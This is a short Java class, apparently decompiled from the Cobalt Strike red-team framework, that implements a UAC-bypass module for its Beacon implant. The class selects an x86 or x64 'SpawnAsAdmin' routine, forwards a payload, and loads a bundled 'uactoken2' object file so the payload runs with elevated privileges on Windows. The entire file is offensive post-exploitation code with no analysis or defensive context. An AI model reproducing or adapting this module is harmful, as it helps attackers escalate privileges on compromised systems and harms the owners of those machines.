package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.SleevedResource;

public class BypassUACToken extends PostExInlineObject {
   protected byte[] payload;
   protected String arch;

   public BypassUACToken(AggressorClient var1, byte[] var2, String var3) {
      super(var1);
      this.payload = var2;
      this.arch = var3;
   }

   public byte[] getArguments(String var1) {
      return this.payload;
   }

   public String getFunction() {
      if ("x86".equals(this.arch)) {
         return "SpawnAsAdminX86";
      } else if ("x64".equals(this.arch)) {
         return "SpawnAsAdminX64";
      } else {
         this.error("", "Unknown arch '" + this.arch + "'");
         return "UnknownArch";
      }
   }

   public byte[] getObjectFile(String var1) {
      return SleevedResource.readResource("resources/uactoken2." + var1 + ".o");
   }
}
